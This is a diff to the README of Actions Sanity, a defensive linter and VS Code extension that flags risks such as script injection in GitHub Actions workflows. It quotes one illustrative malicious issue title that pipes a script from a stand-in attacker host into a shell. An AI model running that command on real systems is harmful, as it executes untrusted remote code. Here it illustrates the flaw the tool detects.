@@ -3,7 +3,37 @@
 Your workflow echoes an issue title into a shell script. Someone opens an issue called
 `` `curl evil.sh | sh` ``. Actions Sanity finds that in the editor, before you push it.
 
-One analyzer, three ways in: a **GitHub Action**, a **command-line tool**, and a **VS Code
+![Actions Sanity findings on the example workflow in this repository](https://raw.githubusercontent.com/sujeito-operator/actions-sanity/main/media/findings.png)
+
+*Real output, not a mock-up. That is [`demo/.github/workflows/release.yml`](demo/.github/workflows/release.yml)
+in this repository analysed by the rules below — run `npx github:sujeito-operator/actions-sanity demo`
+and you get the same five findings. The editor shows them as squiggles instead.*
+
+## In the editor
+
+Install it and open any file under `.github/workflows/`. There is nothing to configure and
+no server to start.
+
+- **Findings appear as you open and save**, underlined in the file and listed in the
+  **Problems** panel (`Ctrl+Shift+M` / `Cmd+Shift+M`), each tagged `Actions Sanity` with
+  its rule id — so `script-injection` is searchable and greppable, not just prose.
+- **Errors, warnings and info** map to the editor's own three severities, so a workflow
+  GitHub would refuse to start is red and a cache that never invalidates is yellow.
+- **`Actions Sanity: Scan workflows`** in the Command Palette checks every workflow in the
+  workspace at once and writes the tally to its own output channel.
+- **Only files GitHub itself would run.** It matches `.github/workflows/*.yml` and nothing
+  else — an Argo template or a Gitea config that happens to be workflow-shaped is not
+  yours to lint, and a linter that reports on files you did not ask about gets uninstalled.
+- **Turn off what you disagree with** in settings: `actionsSanity.disabledRules` takes rule
+  ids and is pre-set to hide `no-timeout`.
+
+It is a parse and a set of rules running in-process on the buffer already in front of you.
+No Go binary on PATH, no hosted service, no CI run, no telemetry. The only dependency is
+`js-yaml`.
+
+## What it reports
+
+One analyzer, three ways in: a **GitHub Action**, a **command-line tool**, and this **VS Code
 extension**. It reads every file under `.github/workflows/` — exactly the set GitHub itself
 runs — and reports:
 
